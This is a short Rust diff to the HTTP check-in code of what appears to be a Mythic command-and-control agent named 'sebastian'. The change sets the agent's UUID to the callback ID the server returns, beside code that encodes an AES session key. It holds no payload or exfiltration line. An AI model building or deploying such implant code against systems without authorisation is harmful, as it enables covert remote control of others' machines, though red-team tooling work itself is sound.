@@ -398,6 +398,11 @@ impl Profile for HttpProfile {
         if let Some(id) = &checkin_response.id {
             eprintln!("[sebastian] Checkin OK, Mythic ID: {}, current UUID: {}", id, self.uuid.read().unwrap());
             profiles::set_mythic_id(id);
+            // Update profile UUID to use Mythic callback ID for all subsequent messages
+            {
+                let mut uuid = self.uuid.write().unwrap();
+                *uuid = id.clone();
+            }
             let key_b64 = {
                 let aes_key = self.aes_key.read().unwrap();
                 aes_key.as_ref().map(|k| BASE64.encode(k))
